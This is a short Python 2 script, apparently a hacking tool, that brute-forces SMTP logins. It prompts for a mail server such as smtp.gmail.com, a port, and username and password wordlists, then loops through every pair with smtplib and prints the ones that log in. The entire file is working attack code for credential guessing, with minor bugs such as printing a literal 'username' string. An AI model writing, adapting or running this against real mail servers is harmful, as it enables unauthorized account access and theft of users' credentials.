import sys, smtplib

end = '\033[0m'
yellow = '\033[33m'
red="\033[0;31m"
green="\033[0;32m"
brown="\033[0;33m"
blue="\033[0;34m"
pur="\033[0;35m" 

def __start__():
	print
	print green+"[+] Please enter IP or HOST server SMTP"
	print "    e.x: [smtp.gmail.com, 0.0.0.0]"+end
	print
	server = raw_input(brown+"SMTP > server >>> "+end)
	print
	print green+"[+] Please enter port SMTP"
	print "    e.x: 587"+end
	print
	port = input(brown+"SMTP > port >>> "+end)
	print
	print green+"[+] Please enter username file"
	print "    e.x: user.txt"+end
	print
	user = raw_input(brown+"SMTP > user >>> "+end)
	print
	print green+"[+] Please enter password file"
	print "    e.x: pass.txt"+end
	print
	passwd = raw_input(brown+"SMTP > pass >>> "+end)
	try:
		userOPEN =  open(user, "r")
		userWORD = userOPEN.readlines()
		userOPEN.close()
	except IOError:
		print
		print red+"[-] Not found user file: "+user+end
		print
		sys.exit()
	try:
		passOPEN =  open(passwd, "r")
		passWORD = passOPEN.readlines()
		passOPEN.close()
	except IOError:
		print
		print red+"[-] Not found pass file: "+passwd+end
		print
		sys.exit()
	try:
		smtpServer = smtplib.SMTP(server, port)
		smtpServer.ehlo()
		smtpServer.starttls()
	except:
		print
		print red+"[-] Not found server or port"+end
		print
		sys.exit()
	for username in userWORD:
		username = username.strip()
		for password in passWORD:
			password = password.strip()
			try:
				smtpServer.login(username, password)
				print
				print brown+"server: "+green+server+end
				print brown+"port: "+green+port+end
				print
				print brown+"username: "+green+username+end
				print brown+"password: "+green+password+end
				print
				raw_input(brown+'Press enter to continue ...'+end)
			except:
				print red+"Try: "+brown+server+end
				print red+"    username: ",brown,'username',end
				print red+"    password: ",brown,password,end





